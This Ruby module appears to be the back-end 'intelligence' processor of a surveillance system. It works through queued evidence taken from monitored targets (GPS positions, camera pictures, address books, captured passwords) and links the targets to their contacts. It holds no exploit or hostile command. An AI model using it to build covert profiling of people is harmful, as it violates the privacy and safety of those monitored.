#
# Intelligence processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

require_relative 'accounts'
require_relative 'camera'
require_relative 'position'
require_relative 'ghost'

module RCS
module Intelligence

class Processor
  extend RCS::Tracer

  def self.run
    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (queued = IntelligenceQueue.get_queued)
        entry = queued.first
        count = queued.last
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    entity = Entity.any_in({path: [Moped::BSON::ObjectId.from_string(entry['target_id'])]}).first

    case entry['type']
      when :evidence
        evidence = Evidence.collection_class(entry['target_id']).find(entry['ident'])
        trace :info, "Processing evidence #{evidence.type} for entity #{entity.name}"
        process_evidence(entity, evidence)

      when :aggregate
        aggregate = Aggregate.collection_class(entry['target_id']).find(entry['ident'])
        trace :info, "Processing aggregte for entity #{entity.name}"
        process_aggregate(entity, aggregate)
    end

  rescue Exception => e
    trace :error, "Cannot process intelligence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def self.process_evidence(entity, evidence)
    case evidence.type
      when 'position'
        # save the last position of the entity
        Position.save_last_position(entity, evidence)
      when 'camera'
        # save picture of the target
        Camera.save_first_camera(entity, evidence)
      when 'addressbook'
        # analyze the accounts
        Accounts.add_handle(entity, evidence)
        # create a ghost entity and link it as :know
        Ghost.create_and_link_entity(entity, Accounts.get_addressbook_handle(evidence)) if LicenseManager.instance.check :intelligence
      when 'password'
        # analyze the accounts
        Accounts.add_handle(entity, evidence)
    end
  end

  def self.process_aggregate(entity, aggregate)
    # process the aggregate and link the entities

    puts "ENTITY: #{entity.inspect}"
    puts "AGGREGATE: #{aggregate.inspect}"

    # normalize the type to search for the correct account
    type = [aggregate.type]
    type = ['phone'] if ['call', 'sms', 'mms'].include? aggregate.type
    type = ['mail', 'gmail'] if ['mail', 'gmail'].include? aggregate.type

    # search for existing entity with that account and link it (direct link)
    if ((peer = Entity.where({:_id.ne => entity._id, "handles.handle" => aggregate.data['peer'], :path => entity.path.first}).in("handles.type" => type).first))
      RCS::DB::LinkManager.instance.add_link(from: entity, to: peer, level: :automatic, type: :peer, versus: aggregate.data['versus'].to_sym, info: aggregate.data['peer'])
      return
    end

    # search if two entities are communicating with a third party and link them (indirect link)

  end

end

end #OCR::
end #RCS::